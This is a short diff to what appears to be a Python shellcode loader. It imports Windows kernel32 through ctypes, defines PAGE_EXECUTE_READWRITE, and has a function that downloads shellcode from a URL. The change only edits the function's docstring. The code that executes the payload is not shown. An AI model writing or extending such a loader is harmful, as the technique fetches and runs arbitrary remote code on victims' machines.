@@ -10,7 +10,7 @@ PAGE_EXECUTE_READWRITE = 0x40
 kernel32 = ctypes.windll.kernel32
 
 def get_code(url):
-    """Download and decode base64 encoded shellcode from a given URL."""
+    """Download shellcode from a given URL."""
     with request.urlopen(url) as response:
         shellcode = response.read()
     return shellcode
